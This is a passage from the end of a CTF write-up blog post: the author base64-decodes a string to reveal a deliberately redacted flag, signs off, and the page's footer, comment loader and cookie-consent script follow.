eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9</code></pre><p id="86b7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Hopefully, after decoding this string we’ll get our flag! Let’s see….</p><pre class="language-bash line-numbers"><code>sak@kali  ~/ctf/thm  echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9" | base64 -d

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{..........}</code></pre><p id="4ad3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Bingoo!!! we got our CTF flag…….</p><blockquote class="abq abr abs"><p id="ef65" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Note: In here I changed the base64 code to not reveal the flag. Cause I really want you to do all the stuff on your own. Why not? IoT hacking isa pleaser.</p></blockquote><p id="4755" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Happy Hacking!!!!! See you next time in another post :)</p><p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p><p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p><p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy Bugged~</strong></p></div></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Nov 30, 2024</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html&amp;via=sakibulalikhan&amp;text=Bugged%20Tryhackme%20CTF%20Writeup" class="js-share invert twitter" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> <span>Twitter</span> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html&amp;media=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fmedia%2Fposts%2F5%2FBugged-Tryhackme-CTF-Writeup.jpg&amp;description=Bugged%20Tryhackme%20CTF%20Writeup" class="js-share invert pinterest" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#pinterest"/></svg> <span>Pinterest</span> </a><a href="https://mix.com/add?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html" class="js-share invert mix" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#mix"/></svg> <span>Mix</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=Bugged%20Tryhackme%20CTF%20Writeup&amp;url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html" class="js-share invert buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=Bugged%20Tryhackme%20CTF%20Writeup https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://sakibulalikhan.pages.dev/the-dirty-pipe-vulnerability-on-linux.html" class="btn previous" rel="prev" aria-label="[MISSING TRANSLATION]:  The Dirty Pipe Vulnerability On Linux "><span class="btn__icon">←</span> <span class="btn__text">The Dirty Pipe Vulnerability On Linux</span> </a><a href="https://sakibulalikhan.pages.dev/how-to-limit-battery-charging-set-a-charge-threshold-for-asus-laptops-on-linux.html" class="btn next" rel="next" aria-label="[MISSING TRANSLATION]:  How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux "><span class="btn__text">How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux</span> <span class="btn__icon">→</span></a></div></nav></article><div class="post__comments"><div class="comments"><div class="comments-wrapper"><h2>Comments</h2><div id="disqus_thread"></div><noscript>Please enable JS to use the comments form.</noscript><script type="text/javascript">var disqus_config = function () {
							this.page.url = 'https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html';
							this.page.identifier = '5'; 
							this.language = 'en_US';
						};
						
						
				var disqus_element_to_check = document.getElementById('disqus_thread');

				if ('IntersectionObserver' in window) {
					var iObserver = new IntersectionObserver(
						(entries, observer) => {
							entries.forEach(entry => {
								if (entry.intersectionRatio >= 0.1) {
									(function () {
										var d = document, s = d.createElement('script');
										s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
										s.setAttribute('data-timestamp', +new Date());
										(d.head || d.body).appendChild(s);
									})();
									observer.unobserve(entry.target);
								}
							});
						},
						{
							threshold: [0, 0.2, 0.5, 1]
						}
					);

					iObserver.observe(disqus_element_to_check);
				} else {
					(function () {
						var d = document, s = d.createElement('script');
						s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
						s.setAttribute('data-timestamp', +new Date());
						(d.head || d.body).appendChild(s);
					})();
				}</script><script type="text/javascript"></script></div></div></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p class="align-center">Sakibul Ali Khan • © 2024 • Offens!ve Blogs • <a href="https://sakibulalikhan.pages.dev/cookie-policy.html" title="Offens!ve Blogs Cookie Policy">Cookies</a> • <a href="https://sakibulalikhan.pages.dev/privacy-policy.html" title="Privacy Policy for Offens!ve Blogs">Privacy</a></p></div></div></footer></div><script defer="defer" src="https://sakibulalikhan.pages.dev/assets/js/scripts.min.js?v=c2232aa7558e9517946129d2a1b8c770"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-line-numbers.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/clipboard.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-copy-to-clipboard.min.js"></script><script src="https://sakibulalikhan.pages.dev/media/plugins/pagePrefetching/quicklink.umd.js"></script><script>window.addEventListener('load', () => {
					quicklink.listen({
						prerender: false,
						el: document.querySelector('body'),
						delay: 0,
						limit: Infinity,
						throttle: Infinity,
						timeout: 2000
					});
				});</script><div class="pcb" data-behaviour="link" data-behaviour-link="https://sakibulalikhan.pages.dev/cookie-policy.html" data-revision="1" data-config-ttl="365" data-debug-mode="false"><div role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="pcb-title" aria-describedby="pcb-txt" class="pcb__banner pcb__banner--left"><div class="pcb__inner"><div id="pcb-title" role="heading" aria-level="2" class="pcb__title">Cookies</div><div id="pcb-txt" class="pcb__txt">To enhance your experience on this website, we use cookies for analytics and performance purposes. <a href="https://sakibulalikhan.pages.dev/cookie-policy.html">Cookie Policy</a></div><div class="pcb__buttons"><button type="button" class="pcb__btn pcb__btn--solid pcb__btn--accept">Got it!</button></div></div></div></div><script>(function(win) {
    if (!document.querySelector('.pcb')) {
        return;
    }

    var cbConfig = {
        behaviour: document.querySelector('.pcb').getAttribute('data-behaviour'),
        behaviourLink: document.querySelector('.pcb').getAttribute('data-behaviour-link'),
        revision: document.querySelector('.pcb').getAttribute('data-revision'),
        configTTL: parseInt(document.querySelector('.pcb').getAttribute('data-config-ttl'), 10),
        debugMode: document.querySelector('.pcb').getAttribute('data-debug-mode') === 'true',
        initialState: null,
        initialLsState: null,
        previouslyAccepted: []
    };

    var cbUI = {
        wrapper: document.querySelector('.pcb'),
        banner: {
            element: null,
            btnAccept: null,
            btnReject: null,
            btnConfigure: null
        },
        popup: {
            element: null,
            btnClose: null,
            btnSave: null,
            btnAccept: null,
            btnReject: null,
            checkboxes: null,
        },
        overlay: null,
        badge: null,
        blockedScripts: document.querySelectorAll('script[type^="gdpr-blocker/"]'),
        triggerLinks: cbConfig.behaviourLink ? document.querySelectorAll('a[href*="' + cbConfig.behaviourLink + '"]') : null
    };

    function initUI () {
        // setup banner elements
        cbUI.banner.element = cbUI.wrapper.querySelector('.pcb__banner');
        cbUI.banner.btnAccept = cbUI.banner.element.querySelector('.pcb__btn--accept');
        cbUI.banner.btnReject = cbUI.banner.element.querySelector('.pcb__btn--reject');
        cbUI.banner.btnConfigure = cbUI.banner.element.querySelector('.pcb__btn--configure');

        // setup popup elements
        if (cbUI.wrapper.querySelector('.pcb__popup')) {
            cbUI.popup.element = cbUI.wrapper.querySelector('.pcb__popup');
            cbUI.popup.btnClose = cbUI.wrapper.querySelector('.pcb__popup__close');
            cbUI.popup.btnSave = cbUI.popup.element.querySelector('.pcb__btn--save');
            cbUI.popup.btnAccept = cbUI.popup.element.querySelector('.pcb__btn--accept');
            cbUI.popup.btnReject = cbUI.popup.element.querySelector('.pcb__btn--reject');
            cbUI.popup.checkboxes = cbUI.popup.element.querySelector('input[type="checkbox"]');
            // setup overlay
            cbUI.overlay = cbUI.wrapper.querySelector('.pcb__overlay');
        }

        cbUI.badge = cbUI.wrapper.querySelector('.pcb__badge');

        if (cbConfig.behaviour.indexOf('link') > -1) {
            for (var i = 0; i < cbUI.triggerLinks.length; i++) {
                cbUI.triggerLinks[i].addEventListener('click', function(e) {
                    e.preventDefault();
                    showBannerOrPopup();
                });
            }
        }
    }

    function initState () {
        var lsKeyName = getConfigName();
        var currentConfig = localStorage.getItem(lsKeyName);
        var configIsFresh = checkIfConfigIsFresh();

        if (!configIsFresh || currentConfig === null) {
            if (cbConfig.debugMode) {
                console.log('🍪 Config not found, or configuration expired');
            }

            if (window.publiiCBGCM) {
                gtag('consent', 'default', {
                    'ad_storage': window.publiiCBGCM.defaultState.ad_storage ? 'granted' : 'denied',
                    'ad_personalization': window.publiiCBGCM.defaultState.ad_personalization ? 'granted' : 'denied',
                    'ad_user_data': window.publiiCBGCM.defaultState.ad_user_data ? 'granted' : 'denied',
                    'analytics_storage': window.publiiCBGCM.defaultState.analytics_storage ? 'granted' : 'denied',
                    'personalization_storage': window.publiiCBGCM.defaultState.personalization_storage ? 'granted' : 'denied',
                    'functionality_storage': window.publiiCBGCM.defaultState.functionality_storage ? 'granted' : 'denied',
                    'security_storage': window.publiiCBGCM.defaultState.security_storage ? 'granted' : 'denied'
                });  
                
                if (cbConfig.debugMode) {
                    console.log('🍪 GCMv2 DEFAULT STATE: ' + JSON.stringify({
                        'ad_storage': window.publiiCBGCM.defaultState.ad_storage ? 'granted' : 'denied',
                        'ad_personalization': window.publiiCBGCM.defaultState.ad_personalization ? 'granted' : 'denied',
                        'ad_user_data': window.publiiCBGCM.defaultState.ad_user_data ? 'granted' : 'denied',
                        'analytics_storage': window.publiiCBGCM.defaultState.analytics_storage ? 'granted' : 'denied',
                        'personalization_storage': window.publiiCBGCM.defaultState.personalization_storage ? 'granted' : 'denied',
                        'functionality_storage': window.publiiCBGCM.defaultState.functionality_storage ? 'granted' : 'denied',
                        'security_storage': window.publiiCBGCM.defaultState.security_storage ? 'granted' : 'denied'
                    }));
                }
            }

            showBanner();
        } else if (typeof currentConfig === 'string') {
            if (cbConfig.debugMode) {
                console.log('🍪 Config founded');
            }

            cbConfig.initialLsState = currentConfig.split(',');

            if (window.publiiCBGCM) {
                gtag('consent', 'default', {
                    'ad_storage': getDefaultConsentState(currentConfig, 'ad_storage'),
                    'ad_personalization': getDefaultConsentState(currentConfig, 'ad_personalization'),
                    'ad_user_data': getDefaultConsentState(currentConfig, 'ad_user_data'),
                    'analytics_storage': getDefaultConsentState(currentConfig, 'analytics_storage'),
                    'personalization_storage': getDefaultConsentState(currentConfig, 'personalization_storage'),
                    'functionality_storage': getDefaultConsentState(currentConfig, 'functionality_storage'),
                    'security_storage': getDefaultConsentState(currentConfig, 'security_storage')
                });
                
                if (cbConfig.debugMode) {
                    console.log('🍪 GCMv2 DEFAULT STATE: ' + JSON.stringify({
                        'ad_storage': getDefaultConsentState(currentConfig, 'ad_storage'),
                        'ad_personalization': getDefaultConsentState(currentConfig, 'ad_personalization'),
                        'ad_user_data': getDefaultConsentState(currentConfig, 'ad_user_data'),
                        'analytics_storage': getDefaultConsentState(currentConfig, 'analytics_storage'),
                        'personalization_storage': getDefaultConsentState(currentConfig, 'personalization_storage'),
                        'functionality_storage': getDefaultConsentState(currentConfig, 'functionality_storage'),
                        'security_storage': getDefaultConsentState(currentConfig, 'security_storage')
                    }));
                }
            }

            showBadge();

            if (cbUI.popup.element) {
                var allowedGroups = currentConfig.split(',');
                var checkedCheckboxes = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');

                for (var j = 0; j < checkedCheckboxes.length; j++) {
                    var name = checkedCheckboxes[j].getAttribute('data-group-name');

                    if (name && name !== '-' && allowedGroups.indexOf(name) === -1) {
                        checkedCheckboxes[j].checked = false;
                    }
                }

                for (var i = 0; i < allowedGroups.length; i++) {
                    var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + allowedGroups[i] + '"]');

                    if (checkbox) {
                        checkbox.checked = true;
                    }

                    allowCookieGroup(allowedGroups[i]);
                }
            }
        }

        setTimeout(function () {
            cbConfig.initialState = getInitialStateOfConsents();
        }, 0);
    }

    function checkIfConfigIsFresh () {
        var lastConfigSave = localStorage.getItem('publii-gdpr-cookies-config-save-date');

        if (lastConfigSave === null) {
            return false;
        }

        lastConfigSave = parseInt(lastConfigSave, 10);

        if (lastConfigSave === 0) {
            return true;
        }

        if (+new Date() - lastConfigSave < cbConfig.configTTL * 24 * 60 * 60 * 1000) {
            return true;
        }

        return false;
    }

    function getDefaultConsentState (currentConfig, consentGroup) {
        let configGroups = currentConfig.split(',');

        for (let i = 0; i < configGroups.length; i++) {
            let groupName = configGroups[i];
            let group = window.publiiCBGCM.groups.find(group => group.cookieGroup === groupName);

            if (group && group[consentGroup]) {
                return 'granted';
            }
        }  
        
        if (window.publiiCBGCM.defaultState[consentGroup]) {
            return 'granted'; 
        }
        
        return 'denied';
    }

    function initBannerEvents () {
        cbUI.banner.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('banner');
            showBadge();
        }, false);

        if (cbUI.banner.btnReject) {
            cbUI.banner.btnReject.addEventListener('click', function (e) {
                e.preventDefault();
                rejectAllCookies();
                showBadge();
            }, false);
        }

        if (cbUI.banner.btnConfigure) {
            cbUI.banner.btnConfigure.addEventListener('click', function (e) {
                e.preventDefault();
                hideBanner();
                showAdvancedPopup();
                showBadge();
            }, false);
        }
    }

    function initPopupEvents () {
        if (!cbUI.popup.element) {
            return;
        }

        cbUI.overlay.addEventListener('click', function (e) {
            hideAdvancedPopup();
        }, false);

        cbUI.popup.element.addEventListener('click', function (e) {
            e.stopPropagation();
        }, false);

        cbUI.popup.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('popup');
        }, false);

        cbUI.popup.btnReject.addEventListener('click', function (e) {
            e.preventDefault();
            rejectAllCookies();
        }, false);

        cbUI.popup.btnSave.addEventListener('click', function (e) {
            e.preventDefault();
            saveConfiguration();
        }, false);

        cbUI.popup.btnClose.addEventListener('click', function (e) {
            e.preventDefault();
            hideAdvancedPopup();
        }, false);
    }

    function initBadgeEvents () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.addEventListener('click', function (e) {
            showBannerOrPopup();
        }, false);
    }

    initUI();
    initState();
    initBannerEvents();
    initPopupEvents();
    initBadgeEvents();

    /**
     * API
     */
    function addScript (src, inline) {
        var newScript = document.createElement('script');

        if (src) {
            newScript.setAttribute('src', src);
        }

        if (inline) {
            newScript.text = inline;
        }

        document.body.appendChild(newScript);
    }

    function allowCookieGroup (allowedGroup) {
        var scripts = document.querySelectorAll('script[type="gdpr-blocker/' + allowedGroup + '"]');
        cbConfig.previouslyAccepted.push(allowedGroup);
    
        for (var j = 0; j < scripts.length; j++) {
            addScript(scripts[j].src, scripts[j].text);
        }

        var groupEvent = new Event('publii-cookie-banner-unblock-' + allowedGroup);
        document.body.dispatchEvent(groupEvent);
        unlockEmbeds(allowedGroup);

        if (cbConfig.debugMode) {
            console.log('🍪 Allowed group: ' + allowedGroup);
        }

        if (window.publiiCBGCM && cbConfig.initialLsState.indexOf(allowedGroup) === -1) {
            let consentResult = {};
            let group = window.publiiCBGCM.groups.find(group => group.cookieGroup === allowedGroup);

            if (group) {
                let foundSomeConsents = false;

                Object.keys(group).forEach(key => {
                    if (key !== 'cookieGroup' && group[key] === true) {
                        consentResult[key] = 'granted';
                        foundSomeConsents = true;
                    }
                });

                if (foundSomeConsents) {
                    gtag('consent', 'update', consentResult);   

                    if (cbConfig.debugMode) {
                        console.log('🍪 GCMv2 UPDATE: ' + JSON.stringify(consentResult));
                    }
                }
            }
        }
    }

    function showBannerOrPopup () {
        if (cbUI.popup.element) {
            showAdvancedPopup();
        } else {
            showBanner();
        }
    }

    function showAdvancedPopup () {
        cbUI.popup.element.classList.add('is-visible');
        cbUI.overlay.classList.add('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'false');
        cbUI.overlay.setAttribute('aria-hidden', 'false');
    }

    function hideAdvancedPopup () {
        cbUI.popup.element.classList.remove('is-visible');
        cbUI.overlay.classList.remove('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'true');
        cbUI.overlay.setAttribute('aria-hidden', 'true');
    }

    function showBanner () {
        cbUI.banner.element.classList.add('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'false');
    }

    function hideBanner () {
        cbUI.banner.element.classList.remove('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'true');
    }

    function showBadge () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.classList.add('is-visible');
        cbUI.badge.setAttribute('aria-hidden', 'false');
    }

    function getConfigName () {
        var lsKeyName = 'publii-gdpr-allowed-cookies';

        if (cbConfig.revision) {
            lsKeyName = lsKeyName + '-v' + parseInt(cbConfig.revision, 10);
        }

        return lsKeyName;
    }

    function storeConfiguration (allowedGroups) {
        var lsKeyName = getConfigName();
        var dataToStore = allowedGroups.join(',');
        localStorage.setItem(lsKeyName, dataToStore);

        if (cbConfig.configTTL === 0) {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', 0);

            if (cbConfig.debugMode) {
                console.log('🍪 Store never expiring configuration');
            }
        } else {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', +new Date());
        }
    }

    function getInitialStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 Initial state: ' + groups.join(', '));
        }

        return groups;
    }

    function getCurrentStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 State to save: ' + groups.join(', '));
        }

        return groups;
    }

    function getAllGroups () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        return groups;
    }

    function acceptAllCookies (source) {
        var groupsToAccept = getAllGroups();
        storeConfiguration(groupsToAccept);

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        if (cbUI.popup.element) {
            var checkboxesToCheck = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');

            for (var j = 0; j < checkboxesToCheck.length; j++) {
                checkboxesToCheck[j].checked = true;
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 Accept all cookies: ', groupsToAccept.join(', '));
        }

        if (source === 'popup') {
            hideAdvancedPopup();
        } else if (source === 'banner') {
            hideBanner();
        }
    }

    function rejectAllCookies () {
        if (cbConfig.debugMode) {
            console.log('🍪 Reject all cookies');
        }

        storeConfiguration([]);
        setTimeout(function () {
            window.location.reload();
        }, 100);
    }

    function saveConfiguration () {
        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
        }

        if (reloadIsNeeded(groupsToAccept)) {
            setTimeout(function () {
                window.location.reload();
            }, 100);
            return;
        }

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        hideAdvancedPopup();
    }

    function reloadIsNeeded (groupsToAccept) {
        // check if user rejected consent for initial groups
        var initialGroups = cbConfig.initialState;
        var previouslyAcceptedGroups = cbConfig.previouslyAccepted;
        var groupsToCheck = initialGroups.concat(previouslyAcceptedGroups);

        for (var i = 0; i < groupsToCheck.length; i++) {
            var groupToCheck = groupsToCheck[i];

            if (groupToCheck !== '' && groupsToAccept.indexOf(groupToCheck) === -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Reload is needed due lack of: ', groupToCheck);
                }

                return true;
            }
        }

        return false;
    }

    function unlockEmbeds (cookieGroup) {
        var iframesToUnlock = document.querySelectorAll('.pec-wrapper[data-consent-group-id="' + cookieGroup + '"]');

        for (var i = 0; i < iframesToUnlock.length; i++) {
            var iframeWrapper = iframesToUnlock[i];
            iframeWrapper.querySelector('.pec-overlay').classList.remove('is-active');
            iframeWrapper.querySelector('.pec-overlay').setAttribute('aria-hidden', 'true');
            var iframe = iframeWrapper.querySelector('iframe');
            iframe.setAttribute('src', iframe.getAttribute('data-consent-src'));
        }
    }

    win.publiiEmbedConsentGiven = function (cookieGroup) {
        // it will unlock embeds
        allowCookieGroup(cookieGroup);

        var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + cookieGroup + '"]');

        if (checkbox) {
            checkbox.checked = true;
        }

        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
        }
    }
})(window);</script></body></html>